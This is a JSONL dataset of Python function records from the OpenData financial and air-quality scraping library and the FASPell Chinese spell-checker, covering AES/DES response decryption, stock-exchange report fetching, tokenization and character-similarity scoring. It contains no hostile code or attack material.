{"docstring": "\"\"\"\n\u5904\u7406\u4f7f\u7528PKCS7\u586b\u5145\u8fc7\u7684\u6570\u636e\n:param text: \u89e3\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\n:return:\n\"\"\"\n", "func_signal": "def pkcs7unpadding(text):\n", "code": "length = len(text)\nunpadding = ord(text[length-1])\nreturn text[0:length-unpadding]", "path": "OpenData/opendatatools/aqi2/util.py", "commit_date": "2019-07-22 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "'''\u722c\u53d6\u7b2cxx\u9875\u4fe1\u606f'''\n# url \u643a\u5e26\u53c2\u6570\uff0c\u8bbe\u7f6e\u4e86\u6bcf\u9875\u663e\u793a 100 \u6761\u4fe1\u606f\n", "func_signal": "def get_page(self, list_url, page):\n", "code": "params = {\n    'rand': 0.3248183083707361,\n    'page': page,\n    'size': 1000,\n}\nurl = list_url + urlencode(params)\nresp = self.do_request(url, json={}, method=\"POST\")\nreturn json.loads(resp)", "path": "OpenData/opendatatools/amac/amac_agent.py", "commit_date": "2019-10-24 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\nAES\u89e3\u5bc6\n key,iv\u4f7f\u7528\u540c\u4e00\u4e2a\n\u6a21\u5f0fcbc\n\u53bb\u586b\u5145pkcs7\n:param key:\n:param content:\n:return:\n\"\"\"\n", "func_signal": "def decrypt_response(des_key, des_iv, aes_key, aes_iv, content):\n", "code": "aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)\ndes = DES.new(des_key, DES.MODE_CBC, des_iv)\n# base64\u89e3\u7801\nencrypt_bytes = base64.b64decode(content)\n# \u89e3\u5bc6\ndecrypt_bytes = des.decrypt(encrypt_bytes)\ndecrypt_bytes = base64.b64decode(decrypt_bytes)\n#decrypt_bytes = pkcs7padding(decrypt_bytes.decode()).encode(\"utf8\")\ndecrypt_bytes = aes.decrypt(decrypt_bytes)\n\n#base64\u89e3\u7801\ndecrypt_bytes = base64.b64decode(decrypt_bytes)\n# \u91cd\u65b0\u7f16\u7801\nresult = str(decrypt_bytes, encoding='utf8')\n# \u53bb\u9664\u586b\u5145\u5185\u5bb9\n#result = pkcs7unpadding(result)\nreturn result", "path": "OpenData/tmp/2.py", "commit_date": "2019-07-21 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "#url = 'http://www.szse.cn/szseWeb/ShowReport.szse'\n", "func_signal": "def _get_rzrq_detail(self, date):\n", "code": "url = 'http://www.szse.cn/api/report/ShowReport'\ndata = {\n    'SHOWTYPE': 'xls',\n    'CATALOGID': '1837_xxpl',\n    'TABKEY': 'tab2',\n    \"txtDate\" : date,\n}\n\nresponse = self.do_request(url, data, method='GET', type='binary')\nif response is not None and len(response) > 0:\n    df = pd.read_excel(io.BytesIO(response))\n    return df\nelse:\n    return None", "path": "OpenData/opendatatools/stock/stock_agent.py", "commit_date": "2018-08-24 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "#url = 'http://www.szse.cn/szseWeb/ShowReport.szse'\n", "func_signal": "def get_index_list(self):\n", "code": "url = 'http://www.szse.cn/api/report/ShowReport'\ndata = {\n    'SHOWTYPE'  : 'xls',\n    'CATALOGID' : '1812',\n}\n\nresponse = self.do_request(url, data, method='GET', type='binary')\ndf = pd.read_excel(io.BytesIO(response))\nreturn df", "path": "OpenData/opendatatools/stock/stock_agent.py", "commit_date": "2018-08-24 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "#url = 'http://www.szse.cn/szseWeb/ShowReport.szse'\n", "func_signal": "def _get_rzrq_total(self, date):\n", "code": "url = 'http://www.szse.cn/api/report/ShowReport'\ndata = {\n    'SHOWTYPE': 'xls',\n    'CATALOGID': '1837_xxpl',\n    'TABKEY' : 'tab1',\n    \"txtDate\": date,\n}\n\nresponse = self.do_request(url, data, method='GET', type='binary')\nif response is not None and len(response) > 0:\n    df = pd.read_excel(io.BytesIO(response))\n    return df\nelse:\n    return None", "path": "OpenData/opendatatools/stock/stock_agent.py", "commit_date": "2018-08-24 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\n\u660e\u6587\u4f7f\u7528PKCS7\u586b\u5145\n\u6700\u7ec8\u8c03\u7528AES\u52a0\u5bc6\u65b9\u6cd5\u65f6\uff0c\u4f20\u5165\u7684\u662f\u4e00\u4e2abyte\u6570\u7ec4\uff0c\u8981\u6c42\u662f16\u7684\u6574\u6570\u500d\uff0c\u56e0\u6b64\u9700\u8981\u5bf9\u660e\u6587\u8fdb\u884c\u5904\u7406\n:param text: \u5f85\u52a0\u5bc6\u5185\u5bb9(\u660e\u6587)\n:return:\n\"\"\"\n", "func_signal": "def pkcs7padding(text):\n", "code": "bs = AES.block_size  # 16\nlength = len(text)\nbytes_length = len(bytes(text, encoding='utf-8'))\n# tips\uff1autf-8\u7f16\u7801\u65f6\uff0c\u82f1\u6587\u53601\u4e2abyte\uff0c\u800c\u4e2d\u6587\u53603\u4e2abyte\npadding_size = length if(bytes_length == length) else bytes_length\npadding = bs - padding_size % bs\n# tips\uff1achr(padding)\u770b\u4e0e\u5176\u5b83\u8bed\u8a00\u7684\u7ea6\u5b9a\uff0c\u6709\u7684\u4f1a\u4f7f\u7528'\\0'\npadding_text = chr(padding) * padding\nreturn text + padding_text", "path": "OpenData/tmp/2.py", "commit_date": "2019-07-21 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "#url = 'http://www.szse.cn/szseWeb/ShowReport.szse'\n", "func_signal": "def get_index_component(self, index):\n", "code": "url = 'http://www.szse.cn/api/report/ShowReport'\ndata = {\n    'SHOWTYPE': 'xls',\n    'CATALOGID': '1747',\n    'ZSDM' : index\n}\n\nresponse = self.do_request(url, data, method='GET', type='binary')\nif response is not None:\n    df = pd.read_excel(io.BytesIO(response))\n    return df\nelse:\n    return None", "path": "OpenData/opendatatools/stock/stock_agent.py", "commit_date": "2018-08-24 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\nAES\u52a0\u5bc6\nkey,iv\u4f7f\u7528\u540c\u4e00\u4e2a\n\u6a21\u5f0fcbc\n\u586b\u5145pkcs7\n:param key: \u5bc6\u94a5\n:param content: \u52a0\u5bc6\u5185\u5bb9\n:return:\n\"\"\"\n", "func_signal": "def aes_encrypt(key, iv, content):\n", "code": "cipher = AES.new(key, AES.MODE_CBC, iv)\n# \u5904\u7406\u660e\u6587\ncontent_padding = pkcs7padding(content)\n# \u52a0\u5bc6\nencrypt_bytes = cipher.encrypt(bytes(content_padding, encoding='utf-8'))\n# \u91cd\u65b0\u7f16\u7801\nresult = str(base64.b64encode(encrypt_bytes), encoding='utf-8')\nreturn result", "path": "OpenData/opendatatools/aqi2/util.py", "commit_date": "2019-07-22 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\nAES\u52a0\u5bc6\nkey,iv\u4f7f\u7528\u540c\u4e00\u4e2a\n\u6a21\u5f0fcbc\n\u586b\u5145pkcs7\n:param key: \u5bc6\u94a5\n:param content: \u52a0\u5bc6\u5185\u5bb9\n:return:\n\"\"\"\n", "func_signal": "def aes_encrypt(key, iv, content):\n", "code": "cipher = AES.new(key, AES.MODE_CBC, iv)\n# \u5904\u7406\u660e\u6587\ncontent_padding = pkcs7padding(content)\n# \u52a0\u5bc6\nencrypt_bytes = cipher.encrypt(bytes(content_padding, encoding='utf-8'))\n# \u91cd\u65b0\u7f16\u7801\nresult = str(base64.b64encode(encrypt_bytes), encoding='utf-8')\nreturn result", "path": "OpenData/tmp/2.py", "commit_date": "2019-07-21 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\nAES\u89e3\u5bc6\n key,iv\u4f7f\u7528\u540c\u4e00\u4e2a\n\u6a21\u5f0fcbc\n\u53bb\u586b\u5145pkcs7\n:param key:\n:param content:\n:return:\n\"\"\"\n", "func_signal": "def decrypt_response(des_key, des_iv, aes_key, aes_iv, content):\n", "code": "aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)\ndes = DES.new(des_key, DES.MODE_CBC, des_iv)\n# base64\u89e3\u7801\nencrypt_bytes = base64.b64decode(content)\n# \u89e3\u5bc6\ndecrypt_bytes = aes.decrypt(encrypt_bytes)\ndecrypt_bytes = base64.b64decode(decrypt_bytes)\ndecrypt_bytes = des.decrypt(decrypt_bytes)\n\n#base64\u89e3\u7801\ndecrypt_bytes = base64.b64decode(decrypt_bytes)\n# \u91cd\u65b0\u7f16\u7801\nresult = str(decrypt_bytes, encoding='utf8')\n# \u53bb\u9664\u586b\u5145\u5185\u5bb9\n#result = pkcs7unpadding(result)\nreturn result", "path": "OpenData/opendatatools/aqi2/util.py", "commit_date": "2019-07-22 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "# \u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u7684\u4fe1\u606f\n    # \u4ece\u8fd9\u91cc\u53ef\u4ee5\u83b7\u53d6\u5230\u6570\u5b57\u8d27\u5e01\u7684symbol\uff0c\u6bd4\u5982\u6bd4\u7279\u5e01BTC\uff0c\u4ee5\u592a\u5e01ETH\n    # data, msg = coin.get_coin_list()\n# \u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u884c\u60c5\u5feb\u7167\n    # \u53c2\u6570\uff1a\u76ee\u6807\u5e01\uff0c\u652f\u4ed8\u5e01\n    # snap, df, msg = coin.get_coin_snapshot('BTC', 'USD')\n\n", "func_signal": "def demo():\n", "code": "    df, msg = coin.get_exchange_list()\n    print(df, msg)\n# \u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u7684\u5b9e\u65f6\u884c\u60c5\n    # \u53c2\u6570\uff1a\u76ee\u6807\u5e01\uff0c\u652f\u4ed8\u5e01\uff0c\u4ea4\u6613\u6240\uff08\u652f\u4ed8\u5e01\u53ef\u4ee5\u662f\u591a\u4e2a\uff0c\u7ed3\u679c\u8fd4\u56de\u591a\u4e2a\uff09\n    # data, msg = coin.get_coin_price('BTC', 'USD,EUR', 'Bitfinex')\n# \u83b7\u53d6\u5206\u949f\u7ebf\uff0c\u5c0f\u65f6\u7ebf\uff0c\u65e5\u7ebf\n    # \u53c2\u6570\uff1a\u76ee\u6807\u5e01\uff0c\u652f\u4ed8\u5e01\uff0c\u4ea4\u6613\u6240\n    # data, msg = coin.get_his_min('BTC', 'USD', 'Bitfinex')\n    # data, msg = coin.get_his_hour('BTC', 'USD', 'Bitfinex')\n    # data, msg = coin.get_his_day('BTC', 'USD', 'Bitfinex')", "path": "OpenData/example/coin_demo.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\n\u5904\u7406\u4f7f\u7528PKCS7\u586b\u5145\u8fc7\u7684\u6570\u636e\n:param text: \u89e3\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\n:return:\n\"\"\"\n", "func_signal": "def pkcs7unpadding(text):\n", "code": "length = len(text)\nunpadding = ord(text[length-1])\nreturn text[0:length-unpadding]", "path": "OpenData/tmp/2.py", "commit_date": "2019-07-21 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\n:param year: \u5e74\u4efd\uff0c\u9ed8\u8ba4\u662f\u672c\u5e74\uff0c\u53ef\u4f20int\u6216str\u7c7b\u578b\n:param month: \u6708\u4efd\uff0c\u9ed8\u8ba4\u662f\u672c\u6708\uff0c\u53ef\u4f20int\u6216str\u7c7b\u578b\n:return: firstDay: \u5f53\u6708\u7684\u7b2c\u4e00\u5929\uff0cdatetime.date\u7c7b\u578b\n          lastDay: \u5f53\u6708\u7684\u6700\u540e\u4e00\u5929\uff0cdatetime.date\u7c7b\u578b\n\"\"\"\n", "func_signal": "def get_month_firstday_and_lastday(year=None, month=None):\n", "code": "if year:\n    year = int(year)\nelse:\n    year = datetime.date.today().year\n\nif month:\n    month = int(month)\nelse:\n    month = datetime.date.today().month\n\n# \u83b7\u53d6\u5f53\u6708\u7b2c\u4e00\u5929\u7684\u661f\u671f\u548c\u5f53\u6708\u7684\u603b\u5929\u6570\nfirstDayWeekDay, monthRange = calendar.monthrange(year, month)\n\n# \u83b7\u53d6\u5f53\u6708\u7684\u7b2c\u4e00\u5929\nfirstDay = datetime.date(year=year, month=month, day=1)\nlastDay = datetime.date(year=year, month=month, day=monthRange)\n\nreturn firstDay, lastDay", "path": "OpenData/opendatatools/common/date_util.py", "commit_date": "2018-07-13 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "# request header\n", "func_signal": "def __init__(self):\n", "code": "self.user_agent = \"Mozilla/5.0 (Windows NT 6.1; WOW64) \" \\\n             \"AppleWebKit/537.36 (KHTML, like Gecko) \" \\\n             \"Chrome/57.0.2987.133 Safari/537.36 \"\n\n# simulate http request\nself.session = requests.Session()\nself.session.headers['User-Agent'] = self.user_agent\nself.session.headers['X-Forwarded-For'] = ':'.join('{0:x}'.format(np.random.randint(0, 2**16 - 1)) for i in range(4)) + ':1'\nself.proxies = None", "path": "OpenData/opendatatools/common/rest_agent.py", "commit_date": "2019-10-30 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\nAES\u89e3\u5bc6\n key,iv\u4f7f\u7528\u540c\u4e00\u4e2a\n\u6a21\u5f0fcbc\n\u53bb\u586b\u5145pkcs7\n:param key:\n:param content:\n:return:\n\"\"\"\n", "func_signal": "def aes_decrypt(key, iv, content):\n", "code": "cipher = AES.new(key, AES.MODE_CBC, iv)\n# base64\u89e3\u7801\nencrypt_bytes = base64.b64decode(content)\n# \u89e3\u5bc6\ndecrypt_bytes = cipher.decrypt(encrypt_bytes)\n# \u91cd\u65b0\u7f16\u7801\nresult = str(decrypt_bytes, encoding='utf8')\n# \u53bb\u9664\u586b\u5145\u5185\u5bb9\nresult = pkcs7unpadding(result)\nreturn result", "path": "OpenData/opendatatools/aqi2/util.py", "commit_date": "2019-07-22 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"\nAES\u89e3\u5bc6\n key,iv\u4f7f\u7528\u540c\u4e00\u4e2a\n\u6a21\u5f0fcbc\n\u53bb\u586b\u5145pkcs7\n:param key:\n:param content:\n:return:\n\"\"\"\n", "func_signal": "def aes_decrypt(key, iv, content):\n", "code": "cipher = AES.new(key, AES.MODE_CBC, iv)\n# base64\u89e3\u7801\nencrypt_bytes = base64.b64decode(content)\n# \u89e3\u5bc6\ndecrypt_bytes = cipher.decrypt(encrypt_bytes)\n# \u91cd\u65b0\u7f16\u7801\nresult = str(decrypt_bytes, encoding='utf8')\n# \u53bb\u9664\u586b\u5145\u5185\u5bb9\nresult = pkcs7unpadding(result)\nreturn result", "path": "OpenData/tmp/2.py", "commit_date": "2019-07-21 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "'''\n    Keyword arguments:\n    fsym - The symbol of the currency you want to get that for\n    tsym - The symbol of the currency that data will be in.\n'''\n", "func_signal": "def get_coin_snapshot(self, fsym, tsym):\n", "code": "data, message = self._fetch(self.COIN_SNAPSHOT_URL + '?fsym=' + fsym + '&tsym=' + tsym)\nif data is None:\n    return None, None, message\n\ndf = pd.DataFrame(data['Exchanges'])\ndf['LASTUPDATE'] = df['LASTUPDATE'].apply(lambda x : int(x))\ndf = self.format_unix_time(df, 'LASTUPDATE')\nreturn data['AggregatedData'], df, message", "path": "OpenData/opendatatools/coin/coin_agent.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "PKUJohnson/OpenData", "stars": 1262, "license": "apache-2.0", "language": "python", "size": 3518}
{"docstring": "\"\"\"Tokenizes a piece of text.\"\"\"\n", "func_signal": "def tokenize(self, text):\n", "code": "text = convert_to_unicode(text)\ntext = self._clean_text(text)\n\n# This was added on November 1st, 2018 for the multilingual and Chinese\n# models. This is also applied to the English models now, but it doesn't\n# matter since the English models were not trained on any Chinese data\n# and generally don't have any Chinese data in them (there are Chinese\n# characters in the vocabulary because Wikipedia does have some Chinese\n# words in the English Wikipedia.).\ntext = self._tokenize_chinese_chars(text)\n\norig_tokens = whitespace_tokenize(text)\nsplit_tokens = []\nfor token in orig_tokens:\n  if self.do_lower_case:\n    token = token.lower()\n    token = self._run_strip_accents(token)\n  split_tokens.extend(self._run_split_on_punc(token))\n\noutput_tokens = whitespace_tokenize(\" \".join(split_tokens))\nreturn output_tokens", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\nthis function returns weighted similarity. When used in FASPell, each weight can only be 0 or 1.\n\"\"\"\n\n# assert char1 in self.char_dict\n# assert char2 in self.char_dict\n", "func_signal": "def similarity(self, char1, char2, weights=(0.8, 0.2, 0.0), as_tree=False):\n", "code": "shape_w, sound_w, freq_w = weights\n\nif char1 in self.char_dict and char2 in self.char_dict:\n\n    shape_sim = self.shape_similarity(char1, char2, as_tree=as_tree)\n    sound_sim = self.pronunciation_similarity(char1, char2)\n    freq_sim = 1.0 - self.char_dict[char2] / len(self.char_dict)\n\n    return shape_sim * shape_w + sound_sim * sound_w + freq_sim * freq_w\nelse:\n    return 0.0", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Loads a vocabulary file into a dictionary.\"\"\"\n", "func_signal": "def load_vocab(vocab_file):\n", "code": "vocab = collections.OrderedDict()\nindex = 0\nwith tf.gfile.GFile(vocab_file, \"r\") as reader:\n  while True:\n    token = convert_to_unicode(reader.readline())\n    if not token:\n      break\n    token = token.strip()\n    vocab[token] = index\n    index += 1\nreturn vocab", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\nThis function converts ids string to a string that can be used as a tree input to APTED.\nAny Error raised by this function implies that the input string is invalid.\n\n>>> string_to_tree('\u2ff1\u2ff1\u2ff0\u4e3f\u31cf\u2ff0\u4e3f\u31cf\u2ff1\u2ff0\u4e3f\u31cf\u2ff0\u4e3f\u31cf')  # \u708e\n'{\u2ff1{\u2ff1{\u2ff0{\u4e3f}{\u31cf}}{\u2ff0{\u4e3f}{\u31cf}}}{\u2ff1{\u2ff0{\u4e3f}{\u31cf}}{\u2ff0{\u4e3f}{\u31cf}}}}'\n>>> string_to_tree('\u2ff1\u2ff0\u4e3f\u31cf\u2ff1\u4e00\u2ff1\u2ffb\u4e00\u4e28\u4e00')  # \u5168\n'{\u2ff1{\u2ff0{\u4e3f}{\u31cf}}{\u2ff1{\u4e00}{\u2ff1{\u2ffb{\u4e00}{\u4e28}}{\u4e00}}}}'\n>>> string_to_tree('\u2ff1\u2ff0\u4e3f\u31cf\u2ffb\u2ff1\u4e00\u2ff1\u2ffb\u4e00\u4e28\u4e00\u4e37') # \u91d1\n'{\u2ff1{\u2ff0{\u4e3f}{\u31cf}}{\u2ffb{\u2ff1{\u4e00}{\u2ff1{\u2ffb{\u4e00}{\u4e28}}{\u4e00}}}{\u4e37}}}'\n>>> string_to_tree('\u2ffb\u2ffb\u2ffb\u4e00\u4e28\u4e00\u2ff4\u2ff1\u2ff0\u4e28\ud840\udccc\u4e00\u4e00') # \u8eca\n'{\u2ffb{\u2ffb{\u2ffb{\u4e00}{\u4e28}}{\u4e00}}{\u2ff4{\u2ff1{\u2ff0{\u4e28}{\ud840\udccc}}{\u4e00}}{\u4e00}}}'\n>>> string_to_tree('\u2ffb\u2ffb\u2ffb\u4e00\u4e28\u2ff0\u4e3f\u31cf\u2ff4\u2ff1\u2ff0\u4e28\ud840\udccc\u4e00\u4e00') # \u6771\n'{\u2ffb{\u2ffb{\u2ffb{\u4e00}{\u4e28}}{\u2ff0{\u4e3f}{\u31cf}}}{\u2ff4{\u2ff1{\u2ff0{\u4e28}{\ud840\udccc}}{\u4e00}}{\u4e00}}}'\n>>> string_to_tree('\u4e3f') # \u4e3f\n'{\u4e3f}'\n>>> string_to_tree('\u2ffb') # \u2ffb\n'{\u2ffb}'\n\n\"\"\"\n", "func_signal": "def string_to_tree(string):\n", "code": "if string[0] in IDCS and len(string) != 1:\n    bracket_stack = []\n    tree = []\n\n    def add_brackets(num):\n        if num == 2:\n            bracket_stack.extend(['}', '{', '}'])\n        else:\n            bracket_stack.extend(['}', '{', '}', '{', '}'])\n        tree.append('{')\n\n    global_just_put = '{'\n\n    for c in string:\n        tree.append(c)\n        if c in IDCS:\n            assert global_just_put != '}'\n            add_brackets(IDCS[c])\n            global_just_put = '{'\n        else:\n            just_put = ''\n            while just_put != '{' and bracket_stack:\n                just_put = bracket_stack.pop(-1)\n                tree.append(just_put)\n            global_just_put = just_put\n\n    res = ''.join(tree)\n    assert res[-1] == '}'\nelse:\n    assert len(string) == 1 or string == 'null'\n    res = string[0]\n\nreturn '{' + res + '}'", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\nWe use APTED algorithm proposed by M. Pawlik and N. Augsten\ngithub link: https://github.com/DatabaseGroup/apted\n\"\"\"\n", "func_signal": "def tree_edit_distance(tree_a, tree_b):\n", "code": "p = Popen(['java', '-jar', APTED_JAR_PATH, '-t', tree_a, tree_b], stdout=PIPE, stderr=STDOUT)\n\nres = [line for line in p.stdout]\nres = res[0]\nres = res.strip()\nres = float(res)\n\nreturn res", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Returns text encoded in a way suitable for print or `tf.logging`.\"\"\"\n\n# These functions want `str` for both Python2 and Python3, but in one case\n# it's a Unicode string and in the other it's a byte string.\n", "func_signal": "def printable_text(text):\n", "code": "if six.PY3:\n  if isinstance(text, str):\n    return text\n  elif isinstance(text, bytes):\n    return text.decode(\"utf-8\", \"ignore\")\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelif six.PY2:\n  if isinstance(text, str):\n    return text\n  elif isinstance(text, unicode):\n    return text.encode(\"utf-8\")\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelse:\n  raise ValueError(\"Not running on Python2 or Python 3?\")", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Strips accents from a piece of text.\"\"\"\n", "func_signal": "def _run_strip_accents(self, text):\n", "code": "text = unicodedata.normalize(\"NFD\", text)\noutput = []\nfor char in text:\n  cat = unicodedata.category(char)\n  if cat == \"Mn\":\n    continue\n  output.append(char)\nreturn \"\".join(output)", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\n>>> edit_distance('abcde', 'avbcude')\n2\n>>> edit_distance(['\u81f3', '\u5202'], ['\u4ebb', '\u81f3', '\u5202'])\n1\n>>> edit_distance('fang', 'qwe')\n4\n>>> edit_distance('fang', 'hen')\n3\n\"\"\"\n", "func_signal": "def edit_distance(string_a, string_b, name='Levenshtein'):\n", "code": "size_x = len(string_a) + 1\nsize_y = len(string_b) + 1\nmatrix = np.zeros((size_x, size_y), dtype=int)\nfor x in range(size_x):\n    matrix[x, 0] = x\nfor y in range(size_y):\n    matrix[0, y] = y\n\nfor x in range(1, size_x):\n    for y in range(1, size_y):\n        if string_a[x - 1] == string_b[y - 1]:\n            matrix[x, y] = min(\n                matrix[x - 1, y] + 1,\n                matrix[x - 1, y - 1],\n                matrix[x, y - 1] + 1\n            )\n        else:\n            if name == 'Levenshtein':\n                matrix[x, y] = min(\n                    matrix[x - 1, y] + 1,\n                    matrix[x - 1, y - 1] + 1,\n                    matrix[x, y - 1] + 1\n                )\n            else:  # Canonical\n                matrix[x, y] = min(\n                    matrix[x - 1, y] + 1,\n                    matrix[x - 1, y - 1] + 2,\n                    matrix[x, y - 1] + 1\n                )\n\nreturn matrix[size_x - 1, size_y - 1]", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\n>>> c = CharFuncs('data/char_meta.txt')\n>>> c.pronunciation_similarity('\u725b', '\u5348')\n0.27999999999999997\n>>> c.pronunciation_similarity('\u7531', '\u7530')\n0.09\n\n\n\"\"\"\n", "func_signal": "def pronunciation_similarity(self, char1, char2):\n", "code": "assert char1 in self.data\nassert char2 in self.data\npronunciations1 = self.data[char1][\"pronunciation\"]\npronunciations2 = self.data[char2][\"pronunciation\"]\n\nif pronunciations1[0] == 'null' or pronunciations2 == 'null':\n    return 0.0\nelse:\n\n    pronunciations1 = pronunciations1.split(';')  # separate by lan\n    pronunciations2 = pronunciations2.split(';')  # separate by lan\n\n    similarity = 0.0\n    count = 0\n    for pron_lan1, pron_lan2 in zip(pronunciations1, pronunciations2):\n        if (pron_lan1 == 'null') or (pron_lan2 == 'null'):\n            pass\n        else:\n            similarity_lan = 0.0\n            for p1 in pron_lan1.split(','):\n                for p2 in pron_lan2.split(','):\n                    tmp_sim = 1 - edit_distance(p1, p2) / max(len(p1), len(p2))\n                    similarity_lan = max(similarity_lan, tmp_sim)\n            similarity += similarity_lan\n            count += 1\n\n    return similarity / count", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Truncates a pair of sequences to a maximum sequence length.\"\"\"\n", "func_signal": "def truncate_seq_pair(tokens_a, tokens_b, max_num_tokens, rng, wrong_tokens_a, wrong_tokens_b):\n", "code": "assert len(tokens_a) == len(wrong_tokens_a)\ntry:\n    assert len(tokens_b) == len(wrong_tokens_b)\nexcept:\n    print(tokens_b)\n    print(wrong_tokens_b)\n    exit()\n\nwhile True:\n    total_length = len(tokens_a) + len(tokens_b)\n    if total_length <= max_num_tokens:\n        break\n\n    trunc_tokens = tokens_a if len(tokens_a) > len(tokens_b) else tokens_b\n    wrong_trunc_tokens = wrong_tokens_a if len(wrong_tokens_a) > len(wrong_tokens_b) else wrong_tokens_b\n    assert len(trunc_tokens) >= 1\n\n    # We want to sometimes truncate from the front and sometimes from the\n    # back to add more randomness and avoid biases.\n    if rng.random() < 0.5:\n        del trunc_tokens[0]\n        del wrong_trunc_tokens[0]\n    else:\n        trunc_tokens.pop()\n        wrong_trunc_tokens.pop()", "path": "FASPell/bert_modified/create_tf_record.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\n>>> c = CharFuncs('data/char_meta.txt')\n>>> c.pronunciation_distance('\u7530', '\u7531')\n3.4\n>>> c.pronunciation_distance('\u725b', '\u5348')\n2.6\n\"\"\"\n", "func_signal": "def pronunciation_distance(self, char1, char2):\n", "code": "assert char1 in self.data\nassert char2 in self.data\npronunciations1 = self.data[char1][\"pronunciation\"]\npronunciations2 = self.data[char2][\"pronunciation\"]\n\nif pronunciations1[0] == 'null' or pronunciations2 == 'null':\n    return 0.0\nelse:\n\n    pronunciations1 = pronunciations1.split(';')  # separate by lan\n    pronunciations2 = pronunciations2.split(';')  # separate by lan\n\n    distance = 0.0\n    count = 0\n    for pron_lan1, pron_lan2 in zip(pronunciations1, pronunciations2):\n        if (pron_lan1 == 'null') or (pron_lan2 == 'null'):\n            pass\n        else:\n            distance_lan = 1e5\n            for p1 in pron_lan1.split(','):\n                for p2 in pron_lan2.split(','):\n                    distance_lan = min(distance_lan, edit_distance(p1, p2))\n            distance += distance_lan\n            count += 1\n\n    return distance / count", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
